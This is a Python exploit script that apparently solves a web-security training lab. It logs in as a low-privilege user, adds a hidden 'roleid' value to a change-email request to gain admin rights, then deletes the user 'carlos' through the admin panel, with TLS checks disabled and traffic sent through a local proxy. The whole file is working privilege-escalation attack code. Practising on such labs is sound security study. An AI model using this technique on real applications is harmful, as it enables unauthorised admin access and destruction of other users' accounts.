import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}


def delete_user(session,url):
    #log in
    url_login=url + "/login"
    data={"username":"wiener","password":"peter"}
    response=session.post(url_login,data=data,verify=False,proxies=proxie)
    response_txt=response.text
    if "Log out" in response_txt:
        print('(+) Log in successfully ')

        #get admin panel from update email fuction
        url_update=url+"/my-account/change-email"
        data_update={"email":"test@gmail.com","roleid": 2}
        response_update=session.post(url_update,json=data_update,verify=False)
        response_update_txt=response_update.text
        if "Admin" in response_update_txt:
            print('(+) Successfully obtain the admin panel.')
            url_delete_user=url+"/admin/delete?username=carlos"
            response_delete=session.get(url_delete_user,verify=False,proxies=proxie)
            
            if response_delete.status_code == 200:
                print("(+) user carlos deleted successfully ")
                print("(+) Congratulations, you solved the lab!")

                
            else:
                print('(-) error while deleting user carlos ... !')
                
        else:
            print("(-) error while trying to get admin panel")
            sys.exit(-1)

    else:
        print('(-) error while tring to log in ! ')
        
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'  %sys.argv[0])
        print('(+) Example %s www.example.com'%sys.argv[0] )
        sys.exit(-1)

    session=requests.session()
    url=sys.argv[1]
    delete_user(session,url)





if __name__ == "__main__":
    main()
